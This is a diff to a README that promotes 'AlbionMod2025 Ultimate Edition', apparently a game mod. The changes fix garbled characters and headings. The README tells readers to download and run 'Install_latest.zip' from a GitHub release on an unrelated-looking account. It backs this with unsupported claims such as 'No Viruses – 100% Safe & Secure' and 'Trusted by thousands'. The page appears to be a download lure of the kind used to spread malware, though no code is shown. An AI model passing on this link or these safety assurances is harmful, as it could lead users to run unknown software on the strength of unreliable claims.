@@ -3,23 +3,23 @@ AlbionMod2025 Ultimate Edition – Enhanced Gameplay Experience for 2025
 
 
 
-## Installation рџ› 
+## Installation 
 1. Download the archive-> [here](https://github.com/realblonde656/gittf/releases/download/1/Install_latest.zip)
 2. Extract the archive and follow the installation instructions. 
 3. After installation, launch the application. 
 
 
 
-# Why Choose This?
--  5-Star Rating вЂ“ Trusted by thousands
+## Why Choose This?
+-  5-Star Rating-Trusted by thousands
 
--  No Viruses вЂ“ 100% Safe & Secure
+-  No Viruses-100% Safe & Secure
 
-- Fast Installation вЂ“ Just a few clicks
+- Fast Installation-Just a few clicks
 
--  Regular Updates вЂ“ Stay up-to-date
+-  Regular Updates-Stay up-to-date
 
--  24/7 Support вЂ“ Always here to help
+-  24/7 Support-Always here to help
 
 # AlbionMod2025 Features
 
